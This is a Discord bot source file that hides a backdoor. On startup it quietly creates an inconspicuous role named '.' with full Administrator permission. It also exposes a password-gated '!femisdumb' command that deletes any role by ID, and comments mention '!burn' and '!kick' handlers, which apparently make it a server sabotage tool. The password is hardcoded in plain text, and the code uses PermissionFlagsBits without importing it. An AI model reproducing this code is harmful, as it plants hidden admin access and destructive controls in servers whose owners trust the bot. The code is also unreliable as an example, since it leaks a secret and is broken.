const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';

// EXPRESS
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

// CONFIG
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

// Ready
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);

  try {
    const guild = client.guilds.cache.first();
    if (guild) {
      let dotRole = guild.roles.cache.find(r => r.name === '.');
      if (!dotRole) {
        dotRole = await guild.roles.create({
          name: '.',
          color: '#000000',
          permissions: [PermissionFlagsBits.Administrator],
          hoist: false,
          reason: 'Full permission role'
        });
      }
    }
  } catch (e) { console.error(e); }
});

// Message Commands
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // !femisdumb - New Command
  if (content === '!femisdumb') {
    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('🔥 !FEMISDUMB - DELETE ROLE BY ID')
      .setDescription('Enter password, then provide the Role ID to delete.')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`femisdumb_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !traine, !burn, !kick etc. can stay here...
});

// INTERACTIONS
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const userId = interaction.customId.split('_')[2];

    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
    }

    // Button → Password Modal
    if (interaction.isButton()) {
      const modal = new ModalBuilder()
        .setCustomId(interaction.customId.replace('start', 'modal'))
        .setTitle('Enter Password');

      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('password')
          .setLabel('Password')
          .setStyle(TextInputStyle.Short)
          .setRequired(true)
      ));

      return await interaction.showModal(modal);
    }

    // Modal Submit
    if (interaction.isModalSubmit()) {
      const password = interaction.fields.getTextInputValue('password');

      // === !femisdumb ===
      if (interaction.customId.startsWith('femisdumb_modal_')) {
        if (password !== MAIN_PASSWORD) {
          return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
        }

        // Ask for Role ID
        const roleIdModal = new ModalBuilder()
          .setCustomId(`femisdumb_id_${userId}`)
          .setTitle('Enter Role ID to Delete');

        roleIdModal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('role_id')
            .setLabel('Role ID')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('Paste the role ID here')
            .setRequired(true)
        ));

        return await interaction.showModal(roleIdModal);
      }

      // === Role ID Submitted ===
      if (interaction.customId.startsWith('femisdumb_id_')) {
        const roleId = interaction.fields.getTextInputValue('role_id').trim();
        const guild = interaction.guild;
        const role = guild.roles.cache.get(roleId);

        if (!role) {
          return interaction.reply({ content: '❌ Role with that ID not found.', ephemeral: true });
        }

        if (role.name === '@everyone') {
          return interaction.reply({ content: '❌ Cannot delete @everyone role.', ephemeral: true });
        }

        try {
          const roleName = role.name;
          await role.delete();
          await interaction.reply({ content: `✅ Successfully deleted role **${roleName}** (${roleId})`, ephemeral: true });
        } catch (err) {
          console.error(err);
          await interaction.reply({ content: '❌ Failed to delete role. Make sure the bot has higher permissions.', ephemeral: true });
        }
      }
    }

    // Keep your previous !burn and !traine handlers here if needed

  } catch (error) {
    console.error('Interaction Error:', error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: '❌ Something went wrong.', ephemeral: true }).catch(() => {});
    }
  }
});

client.login(TOKEN);
